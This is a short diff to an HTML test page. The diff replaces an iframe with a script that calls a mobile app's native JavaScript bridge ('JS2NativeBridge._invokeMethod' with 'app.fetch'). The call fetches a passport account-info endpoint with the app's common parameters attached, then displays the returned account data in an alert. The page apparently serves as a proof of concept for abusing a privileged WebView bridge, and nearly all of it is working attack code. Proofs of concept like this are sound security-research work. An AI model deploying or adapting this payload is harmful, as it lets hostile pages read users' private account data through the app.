@@ -1,6 +1,28 @@
 <body>
-    <h1>IFRAME</h1>
-    <iframe src="https://1234.jinritemai.com">
+    <h>test</h>
 
-    </iframe>
+    <script>
+    window.JSBridge = {
+  _handleMessageFromApp(r) {
+    alert(JSON.stringify(r.__params.data));
+  },
+};
+JS2NativeBridge._invokeMethod(
+  JSON.stringify({
+    func: "app.fetch",
+    __callback_id: "1000",
+    JSSDK: 0,
+    __msg_type: "",
+    params: {
+      url: "https://is.snssdk.com/passport/account/info/v2",
+      needCommonParams: true,
+      method: "GET",
+    },
+    namespace: "",
+    currentUrl: "",
+  })
+);
+
+</script>
 </body>
+
